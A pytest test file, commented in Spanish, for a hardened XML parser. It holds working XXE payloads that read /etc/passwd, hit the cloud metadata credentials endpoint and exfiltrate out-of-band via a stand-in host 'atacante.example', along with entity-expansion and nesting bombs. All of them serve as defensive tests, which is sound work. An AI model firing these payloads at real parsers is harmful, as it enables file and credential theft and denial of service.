"""Tests del parseo endurecido de XML (CLAUDE.md 6.1).

Cada payload es un ataque real, escrito entero en el test para que se lea qué se está
defendiendo. Ninguno toca disco ni red: si alguno lo consiguiera, el test fallaría — que es
justamente lo que se quiere demostrar.
"""

from __future__ import annotations

import pytest

from app.security import xml_safe
from app.security.xml_safe import (
    DtdForbidden,
    MalformedXml,
    MaxDepthExceeded,
    MaxElementsExceeded,
    XmlTooLarge,
)

# --- XXE ------------------------------------------------------------------------------

XXE_LECTURA_DE_FICHERO = b"""<?xml version="1.0"?>
<!DOCTYPE sumario [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<sumario><item>&xxe;</item></sumario>
"""

XXE_HACIA_METADATOS_CLOUD = b"""<?xml version="1.0"?>
<!DOCTYPE sumario [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<sumario><item>&xxe;</item></sumario>
"""

XXE_DTD_EXTERNA = b"""<?xml version="1.0"?>
<!DOCTYPE sumario SYSTEM "http://atacante.example/malicioso.dtd">
<sumario/>
"""

XXE_PARAMETRICA_OOB = b"""<?xml version="1.0"?>
<!DOCTYPE sumario [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://atacante.example/exfiltrar.dtd">
  %dtd;
]>
<sumario/>
"""

# --- Bombas de entidades ----------------------------------------------------------------

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
"""

EXPANSION_CUADRATICA = b"""<?xml version="1.0"?>
<!DOCTYPE bomba [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<bomba>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomba>
"""


@pytest.mark.parametrize(
    ("nombre", "payload"),
    [
        ("xxe lectura de fichero local", XXE_LECTURA_DE_FICHERO),
        ("xxe hacia metadatos de cloud", XXE_HACIA_METADATOS_CLOUD),
        ("dtd externa", XXE_DTD_EXTERNA),
        ("entidad parametrica out-of-band", XXE_PARAMETRICA_OOB),
        ("billion laughs", BILLION_LAUGHS),
        ("expansion cuadratica", EXPANSION_CUADRATICA),
    ],
)
def test_rechaza_todo_documento_con_doctype(nombre: str, payload: bytes) -> None:
    """Prohibir el DOCTYPE entero mata a la vez el XXE y las bombas de entidades.

    Todas estas familias necesitan declarar algo en el DTD. Sin DTD no hay nada que declarar,
    así que el ataque muere en la primera línea en vez de depender de que un filtro de
    entidades no tenga un hueco.
    """
    with pytest.raises(DtdForbidden):
        xml_safe.parse(payload)


def test_el_xxe_no_llega_a_leer_el_fichero() -> None:
    """No basta con que lance: hay que comprobar que no filtró el contenido por el camino."""
    with pytest.raises(DtdForbidden) as excinfo:
        xml_safe.parse(XXE_LECTURA_DE_FICHERO)
    assert "root:" not in str(excinfo.value)
    assert "/bin/" not in str(excinfo.value)


# --- Bombas sin entidades ---------------------------------------------------------------


def test_rechaza_el_anidamiento_excesivo() -> None:
    """Bomba que no usa entidades: solo etiquetas abiertas hasta agotar memoria."""
    profundidad = 5_000
    payload = b"<a>" * profundidad + b"</a>" * profundidad
    with pytest.raises(MaxDepthExceeded):
        xml_safe.parse(payload)


def test_el_anidamiento_se_corta_durante_el_parseo() -> None:
    """El corte llega antes de terminar de leer, no después de construir el árbol entero.

    Se le pasa un documento cuyo cierre está deliberadamente mal formado: si el límite de
    profundidad solo se comprobara al final, primero saltaría el error de sintaxis. Que
    salte MaxDepthExceeded demuestra que abortamos a mitad del documento.
    """
    payload = b"<a>" * 500 + b"<sin-cerrar>"
    with pytest.raises(MaxDepthExceeded):
        xml_safe.parse(payload, max_depth=50)


def test_rechaza_demasiados_elementos() -> None:
    """Documento plano pero con un número desmesurado de nodos hermanos."""
    payload = b"<raiz>" + b"<x/>" * 2_000 + b"</raiz>"
    with pytest.raises(MaxElementsExceeded):
        xml_safe.parse(payload, max_elements=100)


def test_rechaza_documentos_por_encima_del_tope_de_bytes() -> None:
    payload = b"<raiz>" + b"x" * 5_000 + b"</raiz>"
    with pytest.raises(XmlTooLarge):
        xml_safe.parse(payload, max_bytes=1_000)


# --- Entrada inválida --------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        b"<sumario><sin-cerrar></sumario>",
        b"esto no es xml",
        b"",
        b"<<<>>>",
    ],
)
def test_rechaza_xml_mal_formado(payload: bytes) -> None:
    with pytest.raises(MalformedXml):
        xml_safe.parse(payload)


# --- Camino feliz -------------------------------------------------------------------------


def test_parsea_un_sumario_legitimo() -> None:
    payload = b"""<?xml version="1.0" encoding="UTF-8"?>
    <sumario>
      <meta><fecha>2024-12-19</fecha></meta>
      <diario>
        <seccion codigo="1">
          <item id="BOE-A-2024-00001">
            <titulo>Resolucion de ejemplo</titulo>
          </item>
        </seccion>
      </diario>
    </sumario>
    """
    raiz = xml_safe.parse(payload)
    assert raiz.tag == "sumario"
    assert raiz.findtext("./meta/fecha") == "2024-12-19"
    item = raiz.find(".//item")
    assert item is not None
    assert item.get("id") == "BOE-A-2024-00001"


def test_conserva_los_acentos() -> None:
    """El contenido es español: si el encoding se rompiera, el prefiltro léxico de la
    sección 7 empezaría a fallar en silencio con palabras como 'educación'."""
    payload = "<raiz><t>Resolución de coeducación e identidad de género</t></raiz>".encode()
    raiz = xml_safe.parse(payload)
    assert raiz.findtext("t") == "Resolución de coeducación e identidad de género"
